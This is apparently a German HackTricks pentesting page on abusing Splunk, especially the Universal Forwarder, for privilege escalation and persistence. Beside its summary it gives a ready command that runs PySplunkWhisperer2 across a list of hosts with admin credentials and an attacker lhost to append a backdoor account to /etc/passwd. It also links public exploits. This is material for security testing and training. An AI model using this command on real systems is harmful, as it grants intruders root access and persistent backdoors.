# Splunk LPE und Persistenz

{{#include ../../banners/hacktricks-training.md}}

Wenn Sie bei der **Aufzählung** einer Maschine **intern** oder **extern** **Splunk running** (Port 8090) finden und Sie zufällig **gültige Anmeldeinformationen** kennen, können Sie den **Splunk-Dienst missbrauchen**, um eine **Shell** als der Benutzer, der Splunk ausführt, zu **starten**. Wenn root es ausführt, können Sie die Berechtigungen auf root eskalieren.

Wenn Sie bereits root sind und der Splunk-Dienst nicht nur auf localhost hört, können Sie die **Passwort**-Datei **vom** Splunk-Dienst **stehlen** und die Passwörter **knacken** oder **neue** Anmeldeinformationen hinzufügen. Und die Persistenz auf dem Host aufrechterhalten.

Im ersten Bild unten sehen Sie, wie eine Splunkd-Webseite aussieht.

## Zusammenfassung des Splunk Universal Forwarder Agent Exploits

Für weitere Details überprüfen Sie den Beitrag [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Dies ist nur eine Zusammenfassung:

**Überblick über den Exploit:**
Ein Exploit, der auf den Splunk Universal Forwarder Agent (UF) abzielt, ermöglicht es Angreifern mit dem Agentenpasswort, beliebigen Code auf Systemen auszuführen, die den Agenten ausführen, was potenziell ein ganzes Netzwerk gefährden kann.

**Wichtige Punkte:**

- Der UF-Agent validiert keine eingehenden Verbindungen oder die Authentizität von Code, was ihn anfällig für unbefugte Codeausführung macht.
- Häufige Methoden zur Passwortbeschaffung umfassen das Auffinden in Netzwerkverzeichnissen, Dateifreigaben oder interner Dokumentation.
- Erfolgreiche Ausnutzung kann zu SYSTEM- oder root-Zugriff auf kompromittierte Hosts, Datenexfiltration und weiterer Netzwerkpenetration führen.

**Ausführung des Exploits:**

1. Angreifer erhält das UF-Agentenpasswort.
2. Nutzt die Splunk-API, um Befehle oder Skripte an die Agenten zu senden.
3. Mögliche Aktionen umfassen Dateiextraktion, Manipulation von Benutzerkonten und Systemkompromittierung.

**Auswirkungen:**

- Vollständige Netzwerkkompromittierung mit SYSTEM/root-Berechtigungen auf jedem Host.
- Möglichkeit, das Logging zu deaktivieren, um der Erkennung zu entgehen.
- Installation von Hintertüren oder Ransomware.

**Beispielbefehl für die Ausnutzung:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Verwendbare öffentliche Exploits:**

- https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
- https://www.exploit-db.com/exploits/46238
- https://www.exploit-db.com/exploits/46487

## Missbrauch von Splunk-Abfragen

**Für weitere Details siehe den Beitrag [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

{{#include ../../banners/hacktricks-training.md}}
